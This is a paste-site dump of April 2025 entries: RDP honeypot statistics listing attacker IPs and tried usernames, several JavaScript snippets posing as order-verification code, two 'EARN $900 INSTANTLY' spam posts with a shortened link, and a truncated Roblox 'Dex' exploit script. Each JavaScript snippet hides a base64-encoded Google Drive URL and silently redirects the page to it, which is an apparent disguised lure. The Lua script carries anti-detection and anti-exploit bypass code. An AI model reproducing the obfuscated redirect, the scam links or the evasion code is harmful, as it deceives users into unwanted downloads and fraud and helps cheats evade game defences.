id,title,username,language,date,content
8yL0pkU7,2025-04-17_stats.json,rdp_snitch,JSON,Thursday 17th of April 2025 07:18:06 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 7302,
    ""211.185.207.14"": 57,
    ""71.82.170.60"": 24,
    ""80.94.95.198"": 39,
    ""194.165.17.21"": 42,
    ""198.235.24.169"": 9,
    ""167.94.145.107"": 3,
    ""80.94.95.90"": 6,
    ""167.94.138.42"": 3,
    ""88.214.50.50"": 18,
    ""92.255.57.11"": 6,
    ""147.185.132.57"": 9,
    ""194.180.49.123"": 3,
    ""58.218.199.219"": 12,
    ""45.227.254.155"": 6,
    ""194.165.16.166"": 6,
    ""205.210.31.90"": 9,
    ""209.97.162.249"": 3,
    ""193.29.13.50"": 3,
    ""159.89.6.147"": 420,
    ""118.193.58.187"": 3,
    ""173.225.111.171"": 6,
    ""205.210.31.249"": 9
  },
  ""asn"": {
    ""AS212238"": 7302,
    ""AS4766"": 57,
    ""AS20115"": 24,
    ""AS204428"": 45,
    ""AS48721"": 48,
    ""AS396982"": 36,
    ""AS398705"": 3,
    ""AS398324"": 3,
    ""Unknown"": 18,
    ""AS207566"": 6,
    ""AS201814"": 3,
    ""AS4134"": 12,
    ""AS267784"": 6,
    ""AS14061"": 423,
    ""AS42397"": 3,
    ""AS135377"": 3,
    ""AS19318"": 6
  },
  ""isp"": {
    ""Datacamp Limited"": 7302,
    ""Korea Telecom"": 57,
    ""Charter Communications"": 24,
    ""SS-Net"": 45,
    ""Flyservers S.A."": 54,
    ""Google LLC"": 36,
    ""Censys, Inc."": 6,
    ""SIA \""Singularity Telecom\"""": 18,
    ""Chang Way Technologies Co. Limited"": 6,
    ""MEVSPACE sp. z o.o."": 3,
    ""Chinanet"": 12,
    ""DigitalOcean, LLC"": 423,
    ""Bunea TELECOM SRL"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Interserver, Inc"": 6
  },
  ""org"": {
    ""Datacamp Limited"": 7302,
    ""Kornet"": 57,
    ""Spectrum"": 24,
    ""Unmanaged LTD"": 45,
    ""Flyservers S.A"": 48,
    ""Palo Alto Networks, Inc"": 36,
    ""Censys, Inc."": 3,
    ""Censys, Inc"": 3,
    ""SIA \""Singularity Telecom\"""": 18,
    ""Chang Way Technologies Co. Limited"": 6,
    ""HostSlick"": 3,
    ""Chinanet JS"": 12,
    ""Xwin Universal LTD"": 6,
    ""DigitalOcean, LLC"": 423,
    ""Bunea TELECOM SRL"": 3,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Interserver, Inc"": 6
  },
  ""regionName"": {
    ""North West"": 7302,
    ""Sejong-si"": 57,
    ""Wisconsin"": 24,
    ""Budapest"": 45,
    ""Kaunas"": 48,
    ""California"": 36,
    ""Michigan"": 6,
    ""New York"": 18,
    ""Moscow"": 6,
    ""Bavaria"": 3,
    ""Jiangsu"": 12,
    ""Vilnius"": 6,
    ""South West"": 3,
    ""Timi\u0219 County"": 3,
    ""Hesse"": 423,
    ""New Jersey"": 6
  },
  ""country"": {
    ""Singapore"": 7305,
    ""South Korea"": 57,
    ""United States"": 90,
    ""Hungary"": 45,
    ""Lithuania"": 54,
    ""Russia"": 6,
    ""Germany"": 426,
    ""China"": 12,
    ""Romania"": 3
  },
  ""account"": {
    ""hello"": 7740,
    ""142.93.8.59"": 162,
    ""FjPAiKsLS"": 3,
    ""qiHMXy"": 3,
    ""ApmmBj"": 3,
    ""(empty)"": 6,
    ""Administr"": 15,
    ""Domain"": 18,
    ""fxdiCdqDL"": 3,
    ""KkFJGW"": 3,
    ""aXxacq"": 3,
    ""Test"": 18,
    ""SsjFAKjaD"": 3,
    ""paKtjN"": 3,
    ""YjihJO"": 3,
    ""Administrator"": 3,
    ""pXvQQkfcQ"": 3,
    ""aMLdca"": 3,
    ""kDHBhl"": 3
  },
  ""keyboard"": {
    ""Unknown"": 7998
  },
  ""client_build"": {
    ""Unknown"": 7998
  },
  ""client_name"": {
    ""Unknown"": 7998
  },
  ""ip_type"": {
    ""hosting & proxy"": 7302,
    ""Unknown"": 210,
    ""hosting"": 468,
    ""proxy"": 18
  }
}"
Xed8e9un,2025-04-17_stats.json,rdp_snitch,JSON,Thursday 17th of April 2025 07:16:08 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 4868,
    ""211.185.207.14"": 38,
    ""71.82.170.60"": 16,
    ""80.94.95.198"": 26,
    ""194.165.17.21"": 28,
    ""198.235.24.169"": 6,
    ""167.94.145.107"": 2,
    ""80.94.95.90"": 4,
    ""167.94.138.42"": 2,
    ""88.214.50.50"": 12,
    ""92.255.57.11"": 4,
    ""147.185.132.57"": 6,
    ""194.180.49.123"": 2,
    ""58.218.199.219"": 8,
    ""45.227.254.155"": 4,
    ""194.165.16.166"": 4,
    ""205.210.31.90"": 6,
    ""209.97.162.249"": 2,
    ""193.29.13.50"": 2,
    ""159.89.6.147"": 280,
    ""118.193.58.187"": 2,
    ""173.225.111.171"": 4,
    ""205.210.31.249"": 6
  },
  ""asn"": {
    ""AS212238"": 4868,
    ""AS4766"": 38,
    ""AS20115"": 16,
    ""AS204428"": 30,
    ""AS48721"": 32,
    ""AS396982"": 24,
    ""AS398705"": 2,
    ""AS398324"": 2,
    ""Unknown"": 12,
    ""AS207566"": 4,
    ""AS201814"": 2,
    ""AS4134"": 8,
    ""AS267784"": 4,
    ""AS14061"": 282,
    ""AS42397"": 2,
    ""AS135377"": 2,
    ""AS19318"": 4
  },
  ""isp"": {
    ""Datacamp Limited"": 4868,
    ""Korea Telecom"": 38,
    ""Charter Communications"": 16,
    ""SS-Net"": 30,
    ""Flyservers S.A."": 36,
    ""Google LLC"": 24,
    ""Censys, Inc."": 4,
    ""SIA \""Singularity Telecom\"""": 12,
    ""Chang Way Technologies Co. Limited"": 4,
    ""MEVSPACE sp. z o.o."": 2,
    ""Chinanet"": 8,
    ""DigitalOcean, LLC"": 282,
    ""Bunea TELECOM SRL"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Interserver, Inc"": 4
  },
  ""org"": {
    ""Datacamp Limited"": 4868,
    ""Kornet"": 38,
    ""Spectrum"": 16,
    ""Unmanaged LTD"": 30,
    ""Flyservers S.A"": 32,
    ""Palo Alto Networks, Inc"": 24,
    ""Censys, Inc."": 2,
    ""Censys, Inc"": 2,
    ""SIA \""Singularity Telecom\"""": 12,
    ""Chang Way Technologies Co. Limited"": 4,
    ""HostSlick"": 2,
    ""Chinanet JS"": 8,
    ""Xwin Universal LTD"": 4,
    ""DigitalOcean, LLC"": 282,
    ""Bunea TELECOM SRL"": 2,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Interserver, Inc"": 4
  },
  ""regionName"": {
    ""North West"": 4868,
    ""Sejong-si"": 38,
    ""Wisconsin"": 16,
    ""Budapest"": 30,
    ""Kaunas"": 32,
    ""California"": 24,
    ""Michigan"": 4,
    ""New York"": 12,
    ""Moscow"": 4,
    ""Bavaria"": 2,
    ""Jiangsu"": 8,
    ""Vilnius"": 4,
    ""South West"": 2,
    ""Timi\u0219 County"": 2,
    ""Hesse"": 282,
    ""New Jersey"": 4
  },
  ""country"": {
    ""Singapore"": 4870,
    ""South Korea"": 38,
    ""United States"": 60,
    ""Hungary"": 30,
    ""Lithuania"": 36,
    ""Russia"": 4,
    ""Germany"": 284,
    ""China"": 8,
    ""Romania"": 2
  },
  ""account"": {
    ""hello"": 5160,
    ""142.93.8.59"": 108,
    ""FjPAiKsLS"": 2,
    ""qiHMXy"": 2,
    ""ApmmBj"": 2,
    ""(empty)"": 4,
    ""Administr"": 10,
    ""Domain"": 12,
    ""fxdiCdqDL"": 2,
    ""KkFJGW"": 2,
    ""aXxacq"": 2,
    ""Test"": 12,
    ""SsjFAKjaD"": 2,
    ""paKtjN"": 2,
    ""YjihJO"": 2,
    ""Administrator"": 2,
    ""pXvQQkfcQ"": 2,
    ""aMLdca"": 2,
    ""kDHBhl"": 2
  },
  ""keyboard"": {
    ""Unknown"": 5332
  },
  ""client_build"": {
    ""Unknown"": 5332
  },
  ""client_name"": {
    ""Unknown"": 5332
  },
  ""ip_type"": {
    ""hosting & proxy"": 4868,
    ""Unknown"": 140,
    ""hosting"": 312,
    ""proxy"": 12
  }
}"
hzynYFgz,Market.js,SpawnKz,JavaScript,Thursday 17th of April 2025 07:15:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68000/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HetMefCE,2025-04-17_stats.json,rdp_snitch,JSON,Thursday 17th of April 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 2434,
    ""211.185.207.14"": 19,
    ""71.82.170.60"": 8,
    ""80.94.95.198"": 13,
    ""194.165.17.21"": 14,
    ""198.235.24.169"": 3,
    ""167.94.145.107"": 1,
    ""80.94.95.90"": 2,
    ""167.94.138.42"": 1,
    ""88.214.50.50"": 6,
    ""92.255.57.11"": 2,
    ""147.185.132.57"": 3,
    ""194.180.49.123"": 1,
    ""58.218.199.219"": 4,
    ""45.227.254.155"": 2,
    ""194.165.16.166"": 2,
    ""205.210.31.90"": 3,
    ""209.97.162.249"": 1,
    ""193.29.13.50"": 1,
    ""159.89.6.147"": 140,
    ""118.193.58.187"": 1,
    ""173.225.111.171"": 2,
    ""205.210.31.249"": 3
  },
  ""asn"": {
    ""AS212238"": 2434,
    ""AS4766"": 19,
    ""AS20115"": 8,
    ""AS204428"": 15,
    ""AS48721"": 16,
    ""AS396982"": 12,
    ""AS398705"": 1,
    ""AS398324"": 1,
    ""Unknown"": 6,
    ""AS207566"": 2,
    ""AS201814"": 1,
    ""AS4134"": 4,
    ""AS267784"": 2,
    ""AS14061"": 141,
    ""AS42397"": 1,
    ""AS135377"": 1,
    ""AS19318"": 2
  },
  ""isp"": {
    ""Datacamp Limited"": 2434,
    ""Korea Telecom"": 19,
    ""Charter Communications"": 8,
    ""SS-Net"": 15,
    ""Flyservers S.A."": 18,
    ""Google LLC"": 12,
    ""Censys, Inc."": 2,
    ""SIA \""Singularity Telecom\"""": 6,
    ""Chang Way Technologies Co. Limited"": 2,
    ""MEVSPACE sp. z o.o."": 1,
    ""Chinanet"": 4,
    ""DigitalOcean, LLC"": 141,
    ""Bunea TELECOM SRL"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Interserver, Inc"": 2
  },
  ""org"": {
    ""Datacamp Limited"": 2434,
    ""Kornet"": 19,
    ""Spectrum"": 8,
    ""Unmanaged LTD"": 15,
    ""Flyservers S.A"": 16,
    ""Palo Alto Networks, Inc"": 12,
    ""Censys, Inc."": 1,
    ""Censys, Inc"": 1,
    ""SIA \""Singularity Telecom\"""": 6,
    ""Chang Way Technologies Co. Limited"": 2,
    ""HostSlick"": 1,
    ""Chinanet JS"": 4,
    ""Xwin Universal LTD"": 2,
    ""DigitalOcean, LLC"": 141,
    ""Bunea TELECOM SRL"": 1,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Interserver, Inc"": 2
  },
  ""regionName"": {
    ""North West"": 2434,
    ""Sejong-si"": 19,
    ""Wisconsin"": 8,
    ""Budapest"": 15,
    ""Kaunas"": 16,
    ""California"": 12,
    ""Michigan"": 2,
    ""New York"": 6,
    ""Moscow"": 2,
    ""Bavaria"": 1,
    ""Jiangsu"": 4,
    ""Vilnius"": 2,
    ""South West"": 1,
    ""Timi\u0219 County"": 1,
    ""Hesse"": 141,
    ""New Jersey"": 2
  },
  ""country"": {
    ""Singapore"": 2435,
    ""South Korea"": 19,
    ""United States"": 30,
    ""Hungary"": 15,
    ""Lithuania"": 18,
    ""Russia"": 2,
    ""Germany"": 142,
    ""China"": 4,
    ""Romania"": 1
  },
  ""account"": {
    ""hello"": 2580,
    ""142.93.8.59"": 54,
    ""FjPAiKsLS"": 1,
    ""qiHMXy"": 1,
    ""ApmmBj"": 1,
    ""(empty)"": 2,
    ""Administr"": 5,
    ""Domain"": 6,
    ""fxdiCdqDL"": 1,
    ""KkFJGW"": 1,
    ""aXxacq"": 1,
    ""Test"": 6,
    ""SsjFAKjaD"": 1,
    ""paKtjN"": 1,
    ""YjihJO"": 1,
    ""Administrator"": 1,
    ""pXvQQkfcQ"": 1,
    ""aMLdca"": 1,
    ""kDHBhl"": 1
  },
  ""keyboard"": {
    ""Unknown"": 2666
  },
  ""client_build"": {
    ""Unknown"": 2666
  },
  ""client_name"": {
    ""Unknown"": 2666
  },
  ""ip_type"": {
    ""hosting & proxy"": 2434,
    ""Unknown"": 70,
    ""hosting"": 156,
    ""proxy"": 6
  }
}"
AmW5yHjC,EARN $900 INSTANTLY 2025 XH,sde235gud,JavaScript,Thursday 17th of April 2025 07:03:39 PM CDT," 
Pdf https://tinyurl.com/privguidee


dK6hbMZ6kD
"
JMsXAREz,Untitled,SpawnKz,JavaScript,Thursday 17th of April 2025 06:59:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95605/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TBj7Up1A,EARN $900 INSTANTLY 2025⭐ 8F,Armany7800,JavaScript,Thursday 17th of April 2025 06:40:44 PM CDT," 
Pdf https://tinyurl.com/privguidee


oDXEhVgorT
"
SvC6Zh51,Products.js,Ratqueenkslskskwkw,JavaScript,Thursday 17th of April 2025 05:43:36 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20800/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kKzTYmE3,Order.js,Ratqueenkslskskwkw,JavaScript,Thursday 17th of April 2025 05:27:52 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/58480/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jz2v7YQX,Market.js,Ratqueenkslskskwkw,JavaScript,Thursday 17th of April 2025 05:12:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91412/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
h9Hc4hNy,Dex Oslo build,Shhhq0181,Lua,Thursday 17th of April 2025 04:58:20 PM CDT,"--[[
    Dex Oslo build v1.0
    The most powerful and advanced version ever
    Developed by you_noob970
This just try build or alpha 
    With complete performance, interface, and security improvements
]]

local Players = game:GetService(""Players"")
local CoreGui = game:GetService(""CoreGui"")
local TweenService = game:GetService(""TweenService"")
local UserInputService = game:GetService(""UserInputService"")
local TeleportService = game:GetService(""TeleportService"")
local RunService = game:GetService(""RunService"")
local HttpService = game:GetService(""HttpService"")
local StarterGui = game:GetService(""StarterGui"")
local Lighting = game:GetService(""Lighting"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

-- Premium UI settings
local UI_SIZE = UDim2.new(0, 418, 0, 500) -- Adjusted for smaller devices
local BG_COLOR = Color3.fromRGB(10, 10, 20) -- Darker professional look
local ACCENT_COLOR = Color3.fromRGB(0, 180, 255) -- Modified accent color
local ERROR_COLOR = Color3.fromRGB(255, 60, 60)
local SUCCESS_COLOR = Color3.fromRGB(0, 230, 120)
local TEXT_COLOR = Color3.fromRGB(240, 240, 240)
local DARK_TEXT = Color3.fromRGB(30, 30, 40)

-- Anti-Detection System
local function AntiDetection()
    -- Randomize script names
    local randomName = HttpService:GenerateGUID(false)
    randomName = string.gsub(randomName, ""-"", """")
    
    -- Encrypt sensitive functions
    local function EncryptFunc(func)
        local encrypted = {}
        for i = 1, #func do
            table.insert(encrypted, string.char(func:byte(i) + 5))
        end
        return table.concat(encrypted)
    end
    
    -- Hide script in memory
    if not getgenv then
        getgenv = function() return _G end
    end
    
    getgenv()[randomName] = true
    
    -- Basic Anti-Exploit bypass
    if not hookfunction then
        getgenv().hookfunction = function(f, g) return f end
    end
    if not newcclosure then
        getgenv().newcclosure = function(f) return f end
    end
end

AntiDetection()

-- 1. Create premium main UI
local DexOslo = Instance.new(""ScreenGui"")
DexOslo.Name = ""DexOslobuild_""..HttpService:GenerateGUID(false)
DexOslo.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
DexOslo.ResetOnSpawn = false
DexOslo.DisplayOrder = 999

-- 2. Advanced loading screen with 3D effects
local function CreateLoadingScreen()
    local loadingGui = Instance.new(""ScreenGui"")
    loadingGui.Name = ""DexOsloLoading_""..HttpService:GenerateGUID(false)
    loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    loadingGui.DisplayOrder = 1000
    
    local mainFrame = Instance.new(""Frame"")
    mainFrame.Size = UDim2.new(0, 400, 0, 200)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -100) -- Centered
    mainFrame.BackgroundColor3 = BG_COLOR
    mainFrame.BorderSizePixel = 0
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.ClipsDescendants = true
    
    -- Rounded corners with transparency effect
    local corner = Instance.new(""UICorner"")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame
    
    -- Animated gradient effect
    local gradient = Instance.new(""UIGradient"")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 80, 180)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 180, 255))
    })
    gradient.Rotation = 45
    gradient.Parent = mainFrame
    
    -- Gradient movement effect
    spawn(function()
        while loadingGui.Parent do
            gradient.Rotation = (gradient.Rotation + 0.5) % 360
            wait()
        end
    end)
    
    local title = Instance.new(""TextLabel"")
    title.Text = ""DEX OSLO BUILD v1.0""
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 22
    title.TextColor3 = TEXT_COLOR
    title.Size = UDim2.new(1, -40, 0, 50)
    title.Position = UDim2.new(0, 20, 0.1, 0)
    title.BackgroundTransparency = 1
    title.TextXAlignment = Enum.TextXAlignment.Left
    
    -- Text shadow effect
    local titleShadow = title:Clone()
    titleShadow.TextColor3 = Color3.new(0, 0, 0)
    titleShadow.Position = title.Position + UDim2.new(0, 2, 0, 2)
    titleShadow.ZIndex = title.ZIndex - 1
    titleShadow.Parent = mainFrame
    
    local version = Instance.new(""TextLabel"")
    version.Text = ""v1.0 | BUILD Edition | by you_noob970""
    version.Font = Enum.Font.GothamMedium
    version.TextSize = 12
    version.TextColor3 = Color3.fromRGB(180, 180, 180)
    version.Size = UDim2.new(1, -40, 0, 20)
    version.Position = UDim2.new(0, 20, 0.25, 0)
    version.BackgroundTransparency = 1
    version.TextXAlignment = Enum.TextXAlignment.Left
    
    local progressContainer = Instance.new(""Frame"")
    progressContainer.Size = UDim2.new(1, -40, 0, 15)
    progressContainer.Position = UDim2.new(0, 20, 0.6, 0)
    progressContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    progressContainer.BorderSizePixel = 0
    
    local progressCorner = Instance.new(""UICorner"")
    progressCorner.CornerRadius = UDim.new(1, 0)
    progressCorner.Parent = progressContainer
    
    local progressFill = Instance.new(""Frame"")
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.BackgroundColor3 = ACCENT_COLOR
    progressFill.BorderSizePixel = 0
    progressFill.Parent = progressContainer
    
    local progressCornerFill = Instance.new(""UICorner"")
    progressCornerFill.CornerRadius = UDim.new(1, 0)
    progressCornerFill.Parent = progressFill
    
    -- Glow effect for progress bar
    local progressGlow = Instance.new(""ImageLabel"")
    progressGlow.Size = UDim2.new(1, 10, 1, 10)
    progressGlow.Position = UDim2.new(0, -5, 0, -5)
    progressGlow.Image = ""rbxassetid://5028857084""
    progressGlow.ImageColor3 = ACCENT_COLOR
    progressGlow.ScaleType = Enum.ScaleType.Slice
    progressGlow.SliceCenter = Rect.new(20, 20, 480, 480)
    progressGlow.ImageTransparency = 0.7
    progressGlow.BackgroundTransparency = 1
    progressGlow.ZIndex = -1
    progressGlow.Parent = progressFill
    
    local loadingText = Instance.new(""TextLabel"")
    loadingText.Text = ""Loading... 0%""
    loadingText.Font = Enum.Font.GothamBold
    loadingText.TextSize = 16
    loadingText.TextColor3 = TEXT_COLOR
    loadingText.Size = UDim2.new(1, -40, 0, 30)
    loadingText.Position = UDim2.new(0, 20, 0.75, 0)
    loadingText.BackgroundTransparency = 1
    loadingText.TextXAlignment = Enum.TextXAlignment.Left
    
    -- Additional 3D effects
    local glow = Instance.new(""ImageLabel"")
    glow.Size = UDim2.new(1, 60, 1, 60)
    glow.Position = UDim2.new(0, -30, 0, -30)
    glow.BackgroundTransparency = 1
    glow.Image = ""rbxassetid://5028857084""
    glow.ImageColor3 = ACCENT_COLOR
    glow.ScaleType = Enum.ScaleType.Slice
    glow.SliceCenter = Rect.new(20, 20, 480, 480)
    glow.SliceScale = 1
    glow.ImageTransparency = 0.8
    glow.ZIndex = -1
    glow.Parent = mainFrame
    
    -- Particles effect
    local particles = Instance.new(""Frame"")
    particles.Size = UDim2.new(1, 0, 1, 0)
    particles.BackgroundTransparency = 1
    particles.Parent = mainFrame
    
    spawn(function()
        for i = 1, 15 do
            local particle = Instance.new(""Frame"")
            particle.Size = UDim2.new(0, math.random(5, 15), 0, math.random(5, 15))
            particle.Position = UDim2.new(0, math.random(0, 400), 0, math.random(0, 200))
            particle.BackgroundColor3 = ACCENT_COLOR
            particle.BackgroundTransparency = math.random(5, 8)/10
            particle.BorderSizePixel = 0
            particle.Rotation = math.random(0, 360)
            particle.Parent = particles
            
            spawn(function()
                while particle.Parent do
                    particle.Position = UDim2.new(
                        0, (particle.Position.X.Offset + math.random(-2, 2)) % 400,
                        0, (particle.Position.Y.Offset + math.random(-2, 2)) % 200
                    )
                    wait(math.random(1, 3)/10)
                end
            end)
        end
    end)
    
    mainFrame.Parent = loadingGui
    title.Parent = mainFrame
    version.Parent = mainFrame
    progressContainer.Parent = mainFrame
    loadingText.Parent = mainFrame
    loadingGui.Parent = CoreGui
    
    -- Loading effect with smooth animation
    local loadTime = 2.0
    local startTime = tick()
    
    local connection
    connection = RunService.RenderStepped:Connect(function()
        local elapsed = tick() - startTime
        local progress = math.min(elapsed / loadTime, 1)
        
        progressFill.Size = UDim2.new(progress, 0, 1, 0)
        loadingText.Text = string.format(""Loading... %d%%"", math.floor(progress * 100))
        
        -- Change gradient color during loading
        gradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(0, math.floor(80 + progress * 100), 180)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 180, math.floor(255 - progress * 50)))
        })
        
        -- Change particles transparency
        for _, particle in ipairs(particles:GetChildren()) do
            particle.BackgroundTransparency = 0.5 + (progress * 0.5)
        end
        
        if progress >= 1 then
            connection:Disconnect()
            TweenService:Create(mainFrame, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {
                Size = UDim2.new(0, 400, 0, 0),
                Position = UDim2.new(0.5, -200, 0.5, 0)
            }):Play()
            TweenService:Create(glow, TweenInfo.new(0.7), {ImageTransparency = 1}):Play()
            wait(0.7)
            loadingGui:Destroy()
        end
    end)
    
    return loadTime
end

-- 3. Main UI with draggable functionality and modern design
local MainFrame = Instance.new(""Frame"")
MainFrame.Size = UI_SIZE
MainFrame.Position = UDim2.new(0.5, -209, 0.5, -250) -- Centered
MainFrame.BackgroundColor3 = BG_COLOR
MainFrame.BorderSizePixel = 0
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.ClipsDescendants = true

-- Rounded corners with effect
local mainCorner = Instance.new(""UICorner"")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = MainFrame

-- Advanced shadow effect
local shadow = Instance.new(""ImageLabel"")
shadow.Name = ""Shadow""
shadow.Size = UDim2.new(1, 30, 1, 30)
shadow.Position = UDim2.new(0, -15, 0, -15)
shadow.Image = ""rbxassetid://5028857084""
shadow.ImageColor3 = Color3.new(0, 0, 0)
shadow.ScaleType = Enum.ScaleType.Slice
shadow.SliceCenter = Rect.new(20, 20, 480, 480)
shadow.SliceScale = 1
shadow.BackgroundTransparency = 1
shadow.ZIndex = -1
shadow.ImageTransparency = 0.3
shadow.Parent = MainFrame

local TopBar = Instance.new(""Frame"")
TopBar.Size = UDim2.new(1, 0, 0, 40)
TopBar.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
TopBar.BorderSizePixel = 0

local topCorner = Instance.new(""UICorner"")
topCorner.CornerRadius = UDim.new(0, 12)
topCorner.Parent = TopBar

local Title = Instance.new(""TextLabel"")
Title.Text = ""DEX OSLO BUILD V1""
Title.Font = Enum.Font.GothamBlack
Title.TextSize = 16
Title.TextColor3 = ACCENT_COLOR
Title.Size = UDim2.new(0, 250, 1, 0)
Title.Position = UDim2.new(0.5, -125, 0, 0)
Title.BackgroundTransparency = 1

-- Text shadow effect
local titleShadow = Title:Clone()
titleShadow.TextColor3 = Color3.new(0, 0, 0)
titleShadow.Position = Title.Position + UDim2.new(0, 2, 0, 2)
